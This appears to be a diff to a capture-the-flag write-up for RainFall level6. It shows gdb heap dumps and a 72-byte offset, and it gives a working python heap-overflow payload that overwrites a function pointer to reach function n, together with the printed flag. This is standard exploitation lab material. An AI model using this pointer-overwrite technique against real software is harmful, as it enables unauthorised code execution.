@@ -14,6 +14,8 @@ info proc map
 
 tart of heap `0x804a000`
 
+Let's inspect the heap
+
 ```console
 (gdb) x/50x 0x804a000
 0x804a000:	0x00000000	0x00000049	0x41414141	0x00000000
@@ -31,20 +33,38 @@ tart of heap `0x804a000`
 0x804a0c0:	0x00000000	0x00000000
 ```
 
+`0x41414141` is our buffer ("AAAA")
+`0x08048468`is the function ptr
+
 18 x 4 = 72
-I calculated the offset: 72
+I calculated the offset: 72  
 address of m is located 72 bytes after our mallocated buffer  
 
 Lets overwrite value the function ptr with address of function n
 
-```
-./level6 `(python -c 'print ("A" * 72 + "\x54\x84\x04\x08"*12 )')`
-```
-
-```
 ```console
-./level6 `(python -c 'print ("A" * 72 + "\x54\x84\x04\x08"*12 )')`
-level6@RainFall:~$ ./level6 `(python -c 'print ("A" * 72 + "\x54\x84\x04\x08"*12 )')`
-f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+(gdb) x/50x 0x804a000
+0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
+0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a050:	0x08048454	0x00000000	0x00000000	0x00020fa9
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c0:	0x00000000	0x00000000
+```
 
+```
+./level6 `(python -c 'print ("A" * 72 + "\x54\x84\x04\x08")')`
+```
+
+
+```console
+level6@RainFall:~$ ./level6 `(python -c 'print ("A" * 72 + "\x54\x84\x04\x08" )')`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
